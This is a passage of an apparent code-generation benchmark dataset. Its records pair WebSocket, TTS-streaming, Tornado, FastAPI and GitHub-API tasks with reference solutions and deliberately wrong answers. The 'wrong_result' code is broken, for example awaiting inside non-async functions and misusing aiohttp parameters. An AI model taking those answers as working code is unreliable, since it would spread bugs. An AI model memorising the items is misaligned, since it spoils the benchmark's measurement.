    "Instruction": "Task Description: Implement a WebSocket client for text-to-speech (TTS) communication that handles asynchronous streaming of audio and metadata, with support for DRM and error handling.\n\nClass Description: The `Communicate` class manages WebSocket connections to a TTS service, sending text data and receiving audio streams and metadata asynchronously. It handles connection setup, message exchange, DRM challenges, and error scenarios.\n\nAttributes:\n\n- tts_config: [TTSConfig] - Configuration for TTS including voice, rate, volume, and pitch settings.\n- texts: [List[str]] - List of text chunks to be processed, split by byte length constraints.\n- proxy: [Optional[str]] - Proxy URL for the WebSocket connection if needed.\n- session_timeout: [aiohttp.ClientTimeout] - Timeout settings for the WebSocket session.\n- connector: [Optional[aiohttp.BaseConnector]] - Custom connector for the WebSocket session.\n- state: [CommunicateState] - Dictionary tracking streaming state including partial text, offsets, and stream status.\n\nMethods:\n\n- __init__(text: str, voice: str = DEFAULT_VOICE, *, rate: str = \"+0%\", volume: str = \"+0%\", pitch: str = \"+0Hz\", connector: Optional[aiohttp.BaseConnector] = None, proxy: Optional[str] = None, connect_timeout: Optional[int] = 10, receive_timeout: Optional[int] = 60) -> None - Initializes the TTS communication with text and configuration parameters.\n- __stream() -> AsyncGenerator[TTSChunk, None] - Private async generator that handles the WebSocket communication, yielding audio chunks and metadata.\n- stream() -> AsyncGenerator[TTSChunk, None] - Public async generator that manages the streaming process, handling DRM challenges and text chunk iteration.\n- stream_sync() -> Generator[TTSChunk, None, None] - Synchronous wrapper for the async stream method, using a ThreadPoolExecutor to bridge async/sync contexts.",
    "Canonical_solution": "import asyncio\nimport concurrent.futures\nimport json\nimport ssl\nimport time\nimport uuid\nfrom queue import Queue\nfrom typing import AsyncGenerator, Generator, Optional, Union\n\nimport aiohttp\nimport certifi\n\nfrom .constants import DEFAULT_VOICE, SEC_MS_GEC_VERSION, WSS_HEADERS, WSS_URL\nfrom .data_classes import TTSConfig\nfrom .drm import DRM\nfrom .exceptions import (\n    NoAudioReceived,\n    UnexpectedResponse,\n    UnknownResponse,\n    WebSocketError,\n)\nfrom .typing import CommunicateState, TTSChunk\n\nclass Communicate:\n    def __init__(\n        self,\n        text: str,\n        voice: str = DEFAULT_VOICE,\n        *,\n        rate: str = \"+0%\",\n        volume: str = \"+0%\",\n        pitch: str = \"+0Hz\",\n        connector: Optional[aiohttp.BaseConnector] = None,\n        proxy: Optional[str] = None,\n        connect_timeout: Optional[int] = 10,\n        receive_timeout: Optional[int] = 60,\n    ):\n        self.tts_config = TTSConfig(voice, rate, volume, pitch)\n        self.texts = split_text_by_byte_length(\n            escape(remove_incompatible_characters(text)),\n            calc_max_mesg_size(self.tts_config),\n        )\n        self.proxy = proxy\n        self.session_timeout = aiohttp.ClientTimeout(\n            total=None,\n            connect=None,\n            sock_connect=connect_timeout,\n            sock_read=receive_timeout,\n        )\n        self.connector = connector\n        self.state: CommunicateState = {\n            \"partial_text\": b\"\",\n            \"offset_compensation\": 0,\n            \"last_duration_offset\": 0,\n            \"stream_was_called\": False,\n        }\n\n    async def __stream(self) -> AsyncGenerator[TTSChunk, None]:\n        audio_was_received = False\n        ssl_ctx = ssl.create_default_context(cafile=certifi.where())\n        \n        async with aiohttp.ClientSession(\n            connector=self.connector,\n            trust_env=True,\n            timeout=self.session_timeout,\n        ) as session, session.ws_connect(\n            f\"{WSS_URL}&Sec-MS-GEC={DRM.generate_sec_ms_gec()}\"\n            f\"&Sec-MS-GEC-Version={SEC_MS_GEC_VERSION}\"\n            f\"&ConnectionId={connect_id()}\",\n            compress=15,\n            proxy=self.proxy,\n            headers=WSS_HEADERS,\n            ssl=ssl_ctx,\n        ) as websocket:\n            await websocket.send_str(\n                f\"X-Timestamp:{date_to_string()}\\r\\n\"\n                \"Content-Type:application/json; charset=utf-8\\r\\n\"\n                \"Path:speech.config\\r\\n\\r\\n\"\n                '{\"context\":{\"synthesis\":{\"audio\":{\"metadataoptions\":{'\n                '\"sentenceBoundaryEnabled\":\"false\",\"wordBoundaryEnabled\":\"true\"},'\n                '\"outputFormat\":\"audio-24khz-48kbitrate-mono-mp3\"'\n                \"}}}}\\r\\n\"\n            )\n\n            await websocket.send_str(\n                ssml_headers_plus_data(\n                    connect_id(),\n                    date_to_string(),\n                    mkssml(\n                        self.tts_config,\n                        self.state[\"partial_text\"],\n                    ),\n                )\n            )\n\n            async for received in websocket:\n                if received.type == aiohttp.WSMsgType.TEXT:\n                    encoded_data = received.data.encode(\"utf-8\")\n                    parameters, data = get_headers_and_data(\n                        encoded_data, encoded_data.find(b\"\\r\\n\\r\\n\")\n                    )\n                    path = parameters.get(b\"Path\", None)\n                    if path == b\"audio.metadata\":\n                        parsed_metadata = self.__parse_metadata(data)\n                        yield parsed_metadata\n                        self.state[\"last_duration_offset\"] = (\n                            parsed_metadata[\"offset\"] + parsed_metadata[\"duration\"]\n                        )\n                    elif path == b\"turn.end\":\n                        self.state[\"offset_compensation\"] = self.state[\n                            \"last_duration_offset\"\n                        ]\n                        self.state[\"offset_compensation\"] += 8_750_000\n                        break\n                elif received.type == aiohttp.WSMsgType.BINARY:\n                    header_length = int.from_bytes(received.data[:2], \"big\")\n                    parameters, data = get_headers_and_data(\n                        received.data, header_length\n                    )\n                    if parameters.get(b\"Path\") == b\"audio\":\n                        audio_was_received = True\n                        yield {\"type\": \"audio\", \"data\": data}\n                elif received.type == aiohttp.WSMsgType.ERROR:\n                    raise WebSocketError(received.data if received.data else \"Unknown error\")\n\n            if not audio_was_received:\n                raise NoAudioReceived(\"No audio was received.\")\n\n    async def stream(self) -> AsyncGenerator[TTSChunk, None]:\n        if self.state[\"stream_was_called\"]:\n            raise RuntimeError(\"stream can only be called once.\")\n        self.state[\"stream_was_called\"] = True\n\n        for self.state[\"partial_text\"] in self.texts:\n            try:\n                async for message in self.__stream():\n                    yield message\n            except aiohttp.ClientResponseError as e:\n                if e.status != 403:\n                    raise\n                DRM.handle_client_response_error(e)\n                async for message in self.__stream():\n                    yield message\n\n    def stream_sync(self) -> Generator[TTSChunk, None, None]:\n        def fetch_async_items(queue: Queue) -> None:\n            async def get_items() -> None:\n                async for item in self.stream():\n                    queue.put(item)\n                queue.put(None)\n\n            loop = asyncio.new_event_loop()\n            asyncio.set_event_loop(loop)\n            loop.run_until_complete(get_items())\n            loop.close()\n\n        queue: Queue = Queue()\n        with concurrent.futures.ThreadPoolExecutor() as executor:\n            executor.submit(fetch_async_items, queue)\n            while True:\n                item = queue.get()\n                if item is None:\n                    break\n                yield item",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "wrong_result": "import asyncio\nimport aiohttp\nfrom typing import List, Optional, Generator, Dict, Any, AsyncGenerator\nfrom abc import ABC, abstractmethod\n\nclass TTSChunk:\n    def __init__(self, data: Dict[str, Any]):\n        self.data = data\n\nclass TTSConfig:\n    def __init__(self, voice: str, rate: str, volume: str, pitch: str):\n        self.voice = voice\n        self.rate = rate\n        self.volume = volume\n        self.pitch = pitch\n\nclass CommunicateState:\n    def __init__(self):\n        self.partial_text = \"\"\n        self.offsets = {}\n        self.stream_status = \"idle\"\n\nclass Communicate:\n    def __init__(self, text: str, voice: str = \"default\", *, rate: str = \"+0%\", volume: str = \"+0%\", pitch: str = \"+0Hz\", connector: Optional[aiohttp.BaseConnector] = None, proxy: Optional[str] = None, connect_timeout: Optional[int] = 10, receive_timeout: Optional[int] = 60) -> None:\n        self.tts_config = TTSConfig(voice, rate, volume, pitch)\n        self.texts = [text[i:i+1024] for i in range(0, len(text), 1024)]\n        self.proxy = proxy\n        self.session_timeout = aiohttp.ClientTimeout(total=connect_timeout, socket_connect=receive_timeout)\n        self.connector = connector\n        self.state = CommunicateState()\n\n    async def __stream(self) -> AsyncGenerator[TTSChunk, None]:\n        async with aiohttp.ClientSession(timeout=self.session_timeout, connector=self.connector, proxy=self.proxy) as session:\n            ws_url = \"wss://tts.example.com/socket\"\n            try:\n                ws = await session.ws_connect(ws_url)\n                await ws.send_json({\"config\": self.tts_config.__dict__})\n                for text_chunk in self.texts:\n                    await ws.send_str(text_chunk)\n                    while True:\n                        msg = await ws.receive()\n                        if msg.type == aiohttp.WSMsgType.TEXT:\n                            data = msg.data\n                            yield TTSChunk({\"audio\": data})\n                            break\n                        elif msg.type == aiohttp.WSMsgType.ERROR:\n                            raise RuntimeError(f\"WebSocket error: {msg.reason}\")\n                await ws.close()\n            except Exception as e:\n                self.state.stream_status = \"error\"\n                raise\n\n    async def stream(self) -> AsyncGenerator[TTSChunk, None]:\n        try:\n            async for chunk in self.__stream():\n                yield chunk\n        except Exception as e:\n            self.state.stream_status = \"error\"\n            raise\n\n    def stream_sync(self) -> Generator[TTSChunk, None, None]:\n        loop = asyncio.get_event_loop()\n        return loop.run_in_executor(None, self.stream)"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Create a WebSocket client in Python using asyncio and websockets libraries to connect to a WebSocket server, subscribe to a channel, and receive messages, optionally decompressing them if they are gzipped.\n\nFunction Description: The function establishes a WebSocket connection to a specified URI, sends a subscription message, and receives a specified number of messages from the server. It can handle gzip-compressed messages by decompressing them before display.\n\nInput:\n- uri (str): The WebSocket server URI to connect to (e.g., 'wss://api.huobi.pro/ws').\n- sub (str): The subscription message to send to the server (e.g., '{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}').\n- is_gzip (bool): A flag indicating whether the received messages are gzip-compressed.\n- count (int): The number of messages to receive before exiting.\n\nOutput: None (The function prints received messages to the console).",
    "Canonical_solution": "import argparse\nimport asyncio\nimport zlib\nimport websockets\n\nasync def websocket_client(uri, sub, is_gzip, count):\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(sub)\n        print(f\"> {sub}\")\n\n        for i in range(count):\n            response = await websocket.recv()\n            if not is_gzip:\n                print(f\"< {response}\")\n            else:\n                print(f\"< {zlib.decompress(response, 16 + zlib.MAX_WBITS)}\")\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--uri', default='wss://api.huobi.pro/ws', help='URI to connect to')\n    parser.add_argument('--sub', default='{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}', help='Subscription string')\n    parser.add_argument('--count', default=3, type=int, help='Number of messages to receive before exiting')\n    parser.add_argument('-z', action='store_true', help='Use gzip on messages')\n    args = parser.parse_args()\n\n    asyncio.get_event_loop().run_until_complete(\n        websocket_client(args.uri, args.sub, args.z, args.count)\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 46,
    "wrong_result": "import asyncio\nimport websockets\nimport gzip\n\nasync def connect(uri, sub, is_gzip, count):\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(sub)\n        for _ in range(count):\n            message = await websocket.recv()\n            if isinstance(message, str):\n                message_bytes = message.encode('utf-8')\n            else:\n                message_bytes = message\n            if is_gzip:\n                decompressed = gzip.decompress(message_bytes)\n                message = decompressed.decode('utf-8')\n            else:\n                message = message_bytes.decode('utf-8')\n            print(message)"
  },
  {
    "Task_id": 442,
    "Instruction": "Task Description: Implement a WebSocket client class in Python that handles WebSocket connections, message sending/receiving, and callbacks for various WebSocket events. The class should manage commands and notifications with appropriate callbacks and ensure thread-safe operations between the WebSocket thread and the main thread.\n\nClass Description: The Protocol class encapsulates WebSocket connection functionality, providing methods to connect to a WebSocket server, send commands with callbacks, subscribe/unsubscribe to notifications, and handle incoming messages. It manages thread synchronization to safely execute callbacks on the main thread.\n\nAttributes:\n- next_id: [int] - Counter for generating unique command IDs\n- commands: [dict] - Dictionary storing pending commands with their IDs as keys\n- notifications: [dict] - Dictionary storing subscribed notifications with their names as keys\n- url: [str] - WebSocket server URL to connect to\n- on_open: [function] - Callback function for WebSocket open event\n- on_close: [function] - Callback function for WebSocket close event\n- socket: [WebSocketApp] - Instance of WebSocketApp managing the connection\n\nMethods:\n- connect(url, on_open=None, on_close=None) -> [None] - Initiates a WebSocket connection to the specified URL with optional open and close callbacks. Starts a new thread for the WebSocket connection.\n- thread_callback() -> [None] - Thread procedure that sets up WebSocket callbacks and starts the connection loop.\n- send(command, callback=None, options=None) -> [None] - Sends a command through the WebSocket with an optional callback and options. Assigns a unique ID to the command.\n- subscribe(notification, callback) -> [None] - Subscribes to a notification with the specified callback.\n- unsubscribe(notification) -> [None] - Unsubscribes from a notification.\n- message_callback(ws, message) -> [None] - Handles incoming WebSocket messages, parsing them and invoking appropriate command or notification callbacks.\n- open_callback(ws) -> [None] - Handles WebSocket open event, invoking the registered on_open callback.\n- close_callback(ws) -> [None] - Handles WebSocket close event, invoking the registered on_close callback.\n- to_main_thread(f, args) -> [None] - Helper method to execute a function on the main thread with the given arguments.",
    "Canonical_solution": "import os\nimport sys\nimport json\nimport threading\nimport websocket\nimport sublime\n\nclass Protocol:\n    \"\"\"Encapsulate websocket connection\"\"\"\n\n    def __init__(self):\n        self.next_id = 0\n        self.commands = {}\n        self.notifications = {}\n\n    def connect(self, url, on_open=None, on_close=None):\n        \"\"\"Attempt to connect to the web socket\"\"\"\n        self.url = url\n        self.on_open = on_open\n        self.on_close = on_close\n        thread = threading.Thread(target=self.thread_callback)\n        thread.start()\n\n    def thread_callback(self):\n        \"\"\"Threadproc owning the socket.\n           Sets up the callbacks for open, close, and message.\n        \"\"\"\n        self.socket = websocket.WebSocketApp(\n            self.url,\n            on_message=self.message_callback,\n            on_open=self.open_callback,\n            on_close=self.close_callback\n        )\n        self.socket.run_forever()\n\n    def send(self, command, callback=None, options=None):\n        \"\"\"Send to web socket, with optional callback and options\"\"\"\n        command.id = self.next_id\n        command.callback = callback\n        command.options = options\n        self.commands[command.id] = command\n        self.next_id += 1\n        self.socket.send(json.dumps(command.request))\n\n    def subscribe(self, notification, callback):\n        \"\"\"Subscribe to notification with callback\"\"\"\n        notification.callback = callback\n        self.notifications[notification.name] = notification\n\n    def unsubscribe(self, notification):\n        \"\"\"Unsubscribe to notification\"\"\"\n        del self.notifications[notification.name]\n\n    def message_callback(self, ws, message):\n        \"\"\"Callback on any incoming packet.\n           Parse it and call matching callback.\n        \"\"\"\n        parsed = json.loads(message)\n        if 'method' in parsed:\n            if parsed['method'] in self.notifications:\n                notification = self.notifications[parsed['method']]\n                data = notification.parser(parsed['params']) if 'params' in parsed else None\n                self.to_main_thread(notification.callback, (data, notification))\n        else:\n            if parsed['id'] in self.commands:\n                command = self.commands[parsed['id']]\n                del self.commands[parsed['id']]\n                if 'error' in parsed:\n                    self.to_main_thread(print, (\"Error from debuggee: \" + parsed['error']['message'],))\n                else:\n                    command.data = command.parser(parsed['result']) if 'result' in parsed else None\n                    if command.callback:\n                        self.to_main_thread(command.callback, (command,))\n\n    def open_callback(self, ws):\n        if self.on_open:\n            self.to_main_thread(self.on_open, ())\n        print('SWI: WebSocket opened')\n\n    def close_callback(self, ws):\n        if self.on_close:\n            self.to_main_thread(self.on_close, ())\n        print('SWI: WebSocket closed')\n\n    def to_main_thread(self, f, args):\n        \"\"\"Call back on the main thread\n           to simplify the called code\n        \"\"\"\n        if f:\n            sublime.set_timeout(lambda: f(*args))",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "wrong_result": "import threading\nimport json\nfrom websocket import WebSocketApp\n\nclass Protocol:\n    def __init__(self):\n        self.next_id = 0\n        self.commands = {}\n        self.notifications = {}\n        self.url = None\n        self.on_open = None\n        self.on_close = None\n        self.socket = None\n\n    def connect(self, url, on_open=None, on_close=None):\n        self.url = url\n        self.on_open = on_open\n        self.on_close = on_close\n        self.socket = WebSocketApp(url, on_open=self.open_callback, on_close=self.close_callback, on_message=self.message_callback)\n        thread = threading.Thread(target=self.thread_callback)\n        thread.start()\n\n    def thread_callback(self):\n        pass\n\n    def send(self, command, callback=None, options=None):\n        cmd_id = self.next_id\n        self.next_id += 1\n        self.commands[cmd_id] = {'callback': callback, 'args': options or []}\n        self.socket.send(json.dumps({'command': command, 'id': cmd_id}))\n\n    def subscribe(self, notification, callback):\n        self.notifications[notification] = {'callback': callback, 'args': []}\n\n    def unsubscribe(self, notification):\n        if notification in self.notifications:\n            del self.notifications[notification]\n\n    def message_callback(self, ws, message):\n        data = json.loads(message)\n        if 'command' in data:\n            cmd_id = data['command']\n            if cmd_id in self.commands:\n                callback = self.commands[cmd_id]['callback']\n                args = self.commands[cmd_id]['args']\n                self.to_main_thread(callback, args)\n                del self.commands[cmd_id]\n        elif 'notification' in data:\n            notification_name = data['notification']\n            if notification_name in self.notifications:\n                callback = self.notifications[notification_name]['callback']\n                args = self.notifications[notification_name]['args']\n                self.to_main_thread(callback, args)\n\n    def open_callback(self, ws):\n        if self.on_open:\n            self.to_main_thread(self.on_open, [])\n\n    def close_callback(self, ws):\n        if self.on_close:\n            self.to_main_thread(self.on_close, [])\n\n    def to_main_thread(self, f, args):\n        thread = threading.Thread(target=f, args=args)\n        thread.start()"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Implement a WebSocket connection manager class for handling multiple client connections, supporting different subprotocols (JSON and BYTES), and managing message sending/receiving.\n\nClass Description: The ConnectionManager class manages active WebSocket connections, handles different WebSocket subprotocols, and provides methods for sending/receiving messages in the appropriate format.\n\nAttributes:\n- active_connections: List[WebSocket] - Maintains a list of currently active WebSocket connections\n- protocol_dict: Dict[str, WebsocketSubProtocols] - Maps client addresses to their chosen subprotocols\n\nMethods:\n- get_client(websocket: WebSocket) -> str - Returns a string identifier for the client (host:port)\n- get_subprotocol(headers: Dict) -> WebsocketSubProtocols - Determines the subprotocol from request headers\n- connect(websocket: WebSocket) -> None - Accepts a new WebSocket connection and stores its subprotocol\n- disconnect(websocket: WebSocket) -> None - Removes a disconnected WebSocket from active connections\n- receive(websocket: WebSocket) -> Any - Receives a message from the WebSocket using the appropriate subprotocol\n- iter(websocket: WebSocket) -> AsyncIterator[Any] - Provides an async iterator for continuously receiving messages\n- send(websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None - Sends data through the WebSocket using the appropriate subprotocol",
    "Canonical_solution": "from typing import Any, AsyncIterator, Dict, List, Optional, Union\nfrom fastapi import FastAPI, Response, WebSocket, WebSocketDisconnect, status\nfrom jina.enums import WebsocketSubProtocols\nfrom jina.excepts import InternalNetworkError\nfrom jina.types.request.data import DataRequest\nfrom jina.types.request.status import StatusMessage\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[WebSocket] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f'{websocket.client.host}:{websocket.client.port}'\n\n    def get_subprotocol(self, headers: Dict):\n        try:\n            if 'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers['sec-websocket-protocol'])\n            elif b'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers[b'sec-websocket-protocol'].decode())\n            else:\n                subprotocol = WebsocketSubProtocols.JSON\n        except Exception:\n            subprotocol = WebsocketSubProtocols.JSON\n        return subprotocol\n\n    async def connect(self, websocket: WebSocket):\n        await websocket.accept()\n        subprotocol = self.get_subprotocol(dict(websocket.scope['headers']))\n        self.active_connections.append(websocket)\n        self.protocol_dict[self.get_client(websocket)] = subprotocol\n\n    def disconnect(self, websocket: WebSocket):\n        self.protocol_dict.pop(self.get_client(websocket))\n        self.active_connections.remove(websocket)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.receive_json(mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.receive_bytes()\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        try:\n            while True:\n                yield await self.receive(websocket)\n        except WebSocketDisconnect:\n            pass\n\n    async def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.send_json(data.to_dict(), mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.send_bytes(data.to_bytes())",
    "Code_level": "Class-level",
    "FSMID_for_test": 48,
    "wrong_result": "from enum import Enum\nimport json\nimport asyncio\nfrom typing import Dict, List, Any, Union, AsyncIterator, Awaitable\nimport websockets\n\nclass WebsocketSubProtocols(Enum):\n    JSON = \"json\"\n    BYTES = \"bytes\"\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[websockets.WebSocketClientProtocol] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: websockets.WebSocketClientProtocol) -> str:\n        host, port = websocket.remote_address\n        return f\"{host}:{port}\"\n\n    def get_subprotocol(self, headers: Dict) -> WebsocketSubProtocols:\n        sec_web_protocol = headers.get('Sec-WebSocket-Protocol')\n        if sec_web_protocol:\n            if sec_web_protocol.lower() == 'json':\n                return WebsocketSubProtocols.JSON\n            elif sec_web_protocol.lower() == 'bytes':\n                return WebsocketSubProtocols.BYTES\n        return WebsocketSubProtocols.JSON\n\n    def connect(self, websocket: websockets.WebSocketClientProtocol) -> None:\n        client = self.get_client(websocket)\n        subprotocol = self.get_subprotocol(websocket.headers)\n        self.protocol_dict[client] = subprotocol\n        self.active_connections.append(websocket)\n\n    def disconnect(self, websocket: websockets.WebSocketClientProtocol) -> None:\n        if websocket in self.active_connections:\n            self.active_connections.remove(websocket)\n            client = self.get_client(websocket)\n            if client in self.protocol_dict:\n                del self.protocol_dict[client]\n\n    async def receive(self, websocket: websockets.WebSocketClientProtocol) -> Any:\n        message = await websocket.recv()\n        client = self.get_client(websocket)\n        subprotocol = self.protocol_dict[client]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return json.loads(message)\n        else:\n            return message\n\n    def iter(self, websocket: websockets.WebSocketClientProtocol) -> AsyncIterator[Any]:\n        async for message in self._iter_websocket(websocket):\n            yield message\n\n    async def _iter_websocket(self, websocket: websockets.WebSocketClientProtocol) -> AsyncIterator[Any]:\n        while True:\n            try:\n                message = await websocket.recv()\n                client = self.get_client(websocket)\n                subprotocol = self.protocol_dict[client]\n                if subprotocol == WebsocketSubProtocols.JSON:\n                    yield json.loads(message)\n                else:\n                    yield message\n            except websockets.exceptions.ConnectionClosed:\n                break\n\n    def send(self, websocket: websockets.WebSocketClientProtocol, data: Union[dict, bytes]) -> None:\n        client = self.get_client(websocket)\n        subprotocol = self.protocol_dict[client]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            message = json.dumps(data)\n            await websocket.send(message)\n        else:\n            await websocket.send(data)"
  },
  {
    "Task_id": 449,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python to handle real-time communication between clients and the server. The server should manage WebSocket connections, handle incoming messages, and broadcast messages to all connected clients.\n\nClass Description: The WebServer class encapsulates the functionality to start a Tornado-based WebSocket server, manage client connections, and publish messages to all connected clients.\n\nAttributes:\n- path: str - The base path for the WebSocket endpoint.\n- port: int - The port number on which the server will listen (default is 8080).\n- application: tornado.web.Application - The Tornado application instance that handles WebSocket routes.\n- _server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application.\n\nMethods:\n- __init__(path, port=8080) -> None - Initializes the WebServer instance with the specified path and port. Sets up the Tornado application and initializes the list of WebSocket handlers.\n- start() -> None - Starts the Tornado HTTP server and begins listening for WebSocket connections on the specified port. This method blocks and runs the Tornado I/O loop.\n- publish(message) -> None - Broadcasts the given message to all connected WebSocket clients. The message should be a string or JSON-serializable object.",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport logging\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        if self not in self.application._socketHandlers:\n            self.application._socketHandlers.append(self)\n\n    def on_close(self):\n        if self in self.application._socketHandlers:\n            self.application._socketHandlers.remove(self)\n\n    def on_message(self, msg):\n        pass\n\nclass WebServer:\n    def __init__(self, path, port=8080):\n        self.path = path\n        self.port = port\n        self.application = tornado.web.Application([\n            (r'/_cactus/ws', WebSocketHandler),\n        ])\n        self.application._socketHandlers = []\n\n    def start(self):\n        self._server = tornado.httpserver.HTTPServer(self.application)\n        self._server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()\n\n    def publish(self, message):\n        for ws in self.application._socketHandlers:\n            ws.write_message(message)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "wrong_result": "import tornado.web\nimport tornado.websocket\nimport json\n\nclass WebServer:\n    def __init__(self, path, port=8080):\n        self.path = path\n        self.port = port\n        self.application = tornado.web.Application([\n            (path, self.WebSocketHandler),\n        ])\n        self._server = tornado.httpserver.HTTPServer(self.application)\n        self._clients = []\n\n    class WebSocketHandler(tornado.websocket.WebSocketHandler):\n        def open(self):\n            self._server._clients.append(self)\n        def close(self):\n            self._server._clients.remove(self)\n        def on_message(self, message):\n            self._server.publish(message)\n\n    def publish(self, message):\n        data = json.dumps(message)\n        for client in self._clients:\n            client.write_message(data)\n\n    def start(self):\n        self._server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create an asynchronous function to fetch GitHub contributor activity data for a specific repository, filtering by time period and excluding certain users.\n\nFunction Description: This function retrieves GitHub events for a repository and processes them to track contributor activity, including created issues, pull requests, and merged commits. It filters events by date and excludes specified users, using GitHub's API with authentication.\n\nInput:\n- owner: str - GitHub repository owner username\n- repo: str - GitHub repository name\n- since: datetime - Minimum datetime for events to include\n- max: int (default=100) - Maximum number of events to fetch\n- excluded_users: set[str] | None (default=None) - Set of usernames to exclude\n- token: str | None (default=None) - GitHub API token (falls back to Marvin settings if None)\n\nOutput:\n- dict[str, dict[str, str | list]] - Dictionary mapping contributor usernames to their activity data, where each value is a dictionary containing:\n  - \"created_issues\": list - Opened issues by the contributor\n  - \"created_pull_requests\": list - Opened PRs by the contributor\n  - \"merged_commits\": list - Merged commits by the contributor (excluding merge commits)",
    "Canonical_solution": "import httpx\nimport marvin\nfrom datetime import datetime\n\nasync def fetch_contributor_data(\n    owner: str,\n    repo: str,\n    since: datetime,\n    max: int = 100,\n    excluded_users: set[str] | None = None,\n    token: str | None = None,\n) -> dict[str, dict[str, str | list]]:\n    if not excluded_users:\n        excluded_users = {}\n\n    if not token:\n        token = marvin.settings.github_token.get_secret_value()\n\n    events_url = f\"https://api.github.com/repos/{owner}/{repo}/events?per_page={max}\"\n\n    contributors_activity = {}\n\n    async with httpx.AsyncClient(\n        headers={\n            \"Accept\": \"application/vnd.github.v3+json\",\n            \"Authorization\": f\"token {token}\",\n        }\n    ) as client:\n        events = (await client.get(events_url)).json()\n\n        for event in events:\n            if (actor := event.get(\"actor\")) and actor[\"login\"] in excluded_users:\n                continue\n            created_at = datetime.fromisoformat(event[\"created_at\"].rstrip(\"Z\"))\n            if created_at < since:\n                continue\n\n            contributor_username = actor[\"login\"] if actor else \"unknown\"\n\n            if contributor_username not in contributors_activity:\n                contributors_activity[contributor_username] = {\n                    \"created_issues\": [],\n                    \"created_pull_requests\": [],\n                    \"merged_commits\": [],\n                }\n\n            if (\n                event[\"type\"] == \"IssuesEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\"created_issues\"].append(\n                    event[\"payload\"][\"issue\"]\n                )\n\n            elif (\n                event[\"type\"] == \"PullRequestEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\n                    \"created_pull_requests\"\n                ].append(event[\"payload\"][\"pull_request\"])\n\n            elif event[\"type\"] == \"PushEvent\":\n                for commit_data in event[\"payload\"][\"commits\"]:\n                    commit = (await client.get(commit_data[\"url\"])).json()\n                    commit_message = commit[\"commit\"][\"message\"].split(\"\\n\")\n                    cleaned_commit_message = \"\\n\".join(\n                        line\n                        for line in commit_message\n                        if not line.strip().lower().startswith(\"co-authored-by:\")\n                    )\n                    commit_msg = commit[\"commit\"][\"message\"] = cleaned_commit_message\n\n                    if (\n                        \"Merge remote-tracking branch\" not in commit_msg\n                        and \"Merge branch\" not in commit_msg\n                    ):\n                        contributors_activity[contributor_username][\n                            \"merged_commits\"\n                        ].append(commit)\n\n    return contributors_activity",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import aiohttp\nimport asyncio\nimport datetime\n\nasync def get_contributor_activity(owner: str, repo: str, since: datetime.datetime, max: int = 100, excluded_users: set[str] | None = None, token: str | None = None) -> dict[str, dict[str, str | list]]:\n    headers = {}\n    if token:\n        headers = {'Authorization': f'token {token}'}\n    \n    url = f'https://api.github.com/repos/{owner}/{repo}/events'\n    params = {\n        'since': int(since.timestamp()),\n        'per_page': max\n    }\n    \n    async with aiohttp.ClientSession() as session:\n        async with session.get(url, params=params, headers=headers) as resp:\n            data = await resp.json()\n        \n        result = {}\n        \n        for event in data:\n            actor = event['actor']\n            user = actor['login']\n            if excluded_users and user in excluded_users:\n                continue\n            \n            event_type = event['type']\n            \n            if event_type == 'IssueEvent':\n                action = event['payload']['action']\n                if action == 'opened':\n                    issue_url = event['payload']['issue']['html_url']\n                    if user not in result:\n                        result[user] = {\n                            'created_issues': [],\n                            'created_pull_requests': [],\n                            'merged_commits': []\n                        }\n                    result[user]['created_issues'].append(issue_url)\n            \n            elif event_type == 'PullRequestEvent':\n                action = event['payload']['action']\n                if action == 'opened':\n                    pr_url = event['payload']['pull_request']['html_url']\n                    if user not in result:\n                        result[user] = {\n                            'created_issues': [],\n                            'created_pull_requests': [],\n                            'merged_commits': []\n                        }\n                    result[user]['created_pull_requests'].append(pr_url)\n                elif action == 'merged':\n                    pr_number = event['payload']['pull_request']['number']\n                    pr_commits_url = f'https://api.github.com/repos/{owner}/{repo}/pulls/{pr_number}/commits'\n                    async with session.get(pr_commits_url, headers=headers) as pr_resp:\n                        pr_data = await pr_resp.json()\n                        for commit in pr_data:\n                            commit_hash = 